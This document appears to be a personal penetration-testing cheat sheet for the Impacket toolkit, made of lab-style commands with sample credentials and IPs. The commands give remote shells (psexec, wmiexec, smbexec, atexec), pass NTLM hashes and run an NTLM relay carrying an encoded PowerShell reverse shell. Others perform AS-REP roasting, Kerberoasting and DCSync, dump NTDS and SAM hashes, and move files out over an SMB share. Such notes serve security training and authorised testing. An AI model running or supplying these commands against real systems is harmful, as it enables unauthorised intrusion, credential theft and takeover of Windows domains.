> Impacket is a collection of Python3 classes focused on providing access to network packets. Impacket allows Python3 developers to craft and decode network packets in simple and consistent manner. It includes support for low-level protocols such as IP, UDP and TCP, as well as higher-level protocols such as NMB and SMB.
https://www.13cubed.com/downloads/impacket_exec_commands_cheat_sheet.pdf
https://cheatsheet.haax.fr/windows-systems/exploitation/impacket/


#MSSQL

Connecting to the Remote MSSQL instance via `impacket-mssqlclient`
```bash
impacket-mssqlclient Administrator:Sale123@192.168.169.123 -windows-auth
```
- Try to execute command via xp_cmdshell

Connecting to the Remote MSSQL instance via `impacket-mssqlclient` on specific port
```bash
impacket-mssqlclient hentaisqlman:BigTablesSmol1@192.168.169.123 -port 1433
```

#File_Sharing 

Starting an SMB server with the share name `SUSSYSHARE` and share path `~/Downloads` on own Kali machine
```bash
impacket-smbserver -smb2support SUSSYSHARE ~/Downloads
```
```
impacket-smbserver -port 8888 -smb2support SUSSYSHARE ~/Downloads
```

Copy a file to the SMB share from remote Windows Machine
```powershell
copy sendthis.txt \\192.168.50.222\SUSSYSHARE\
```

#Shell_Access #Remote_Access

Get fully-interactive shell access using `impacket-wmiexec`
```bash
impacket-wmiexec salesman1:password123\!@192.168.169.123
```
```bash
proxychains impacket-wmiexec hentaicorp/Administrator:'wow!NICESALEs2$'@172.16.69.12
```

Get fully-interactive shell access using `impacket-psexec`
```bash
impacket-psexec salesman1:password123\!@192.168.169.123
```
```bash
proxychains impacket-psexec hentaicorp/Administrator:'wow!NICESALEs2$'@172.16.69.12
```

Get semi-interactive shell using `impacket-smbexec`
```bash
impacket-smbexec salesman1:password123\!@192.168.169.123
```
```bash
proxychains impacket-smbexec hentaicorp/Administrator:'wow!NICESALEs2$'@172.16.69.12
```

Remote code execution using `impacket-atexec`
```bash
impacket-atexec salesman1:password123\!@192.168.169.123 whoami 
```
```bash
proxychains impacket-atexec hentaicorp/Administrator:'wow!NICESALEs2$'@172.16.69.12 whoami
```

#Shell_Access #Remote_Access #Password_Attacks #Pass_the_Hash 

## Passing NTLM

Using `impacket-psexec` to get an interactive shell by passing the NTLM Hash.
Since we are only using the NTLM hash, fill the LMHash section with 32 0's
```bash
impacket-psexec -hashes 00000000000000000000000000000000:90ebeef0762ed12104b3a77aa8396669 Administrator@192.168.169.123
hostname
ipconfig
whoami
exit
```
```
impacket-psexec -hashes :90ebeef0762ed12104b3a77aa8396669 Administrator@192.168.169.123
```

Using `impacket-wmiexec` to get an interactive shell by passing the NTLM Hash
Since we are only using the NTLM hash, fill the LMHash section with 32 0's
```bash
impacket-wmiexec -hashes 00000000000000000000000000000000:02645f0e29a38ab591777e316bed0e69 Administrator@192.168.169.123
```
```bash
/usr/bin/impacket-wmiexec -hashes :C7083D7A9F02BE5BDFD2648922EC4269 Administrator@192.168.169.123
```

## Relaying Net-NTLMv2

Starting `impacket-ntlmrelayx` for a relay-attack targeting a machine with a base64-encoded PowerShell reverse shell one-liner
```bash
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.169.123 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADYAOQAuADEANgA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

#Active_Directory_Authentication 

Use GetNPUsers to get the AS-REP hash (AS-REP Roasting)
- Get user password hashes that "Do not require Kerberos preauthentication"
```
impacket-GetNPUsers -dc-ip 192.168.169.123 -request -outputfile hashes.asreproast hentaii.com/salesman
```

Use GetUserSPNs to get the TGS-REP hash (Kerberoasting)
- Get service account password hashes
```
sudo impacket-GetUserSPNs -request -dc-ip 192.168.169.123 hentaii.com/salesman
```

#NTLM_Hash

Use secretsdump to perform a DCsync attack
- Request NTLM hash of users by impersonatng a domain controller using replication
```
impacket-secretsdump -just-dc-user salezman hentai.com/salesadmin:"T3hBirBsAnDtHeBeeZBooBoom4321\!"@192.168.69.42
```
- `-just-dc-user` 
	- Target username
- `domain/user:password@ip`
	- Domain
	- Credentials of a user with the required rights
	- IP of the domain controller

Extract NTLM hashes and Kerberos keys for every AD user
```
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```
- `-ntds`
	- ntds database
		- `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak`
- `-system`
	- system hive
		- `reg.exe save hklm\system c:\system.bak`
- `LOCAL`
	- parse the files locally

Extract NTLM hashes for local users given `SAM` and `SYSTEM` files
```
impacket-secretsdump -system SYSTEM LOCAL -sam SAM 
```

Remotely extract NTLM hashes on the DC machine with credentials from your Kali Machine
```bash
impacket-secretsdump -just-dc-ntlm domain/user:password@IP
```
```bash
impacket-secretsdump -just-dc-ntlm domain/user:@IP-hashes LMHASH:NTHASH
```
- These commands only work on the DC. Use mimikatz for others.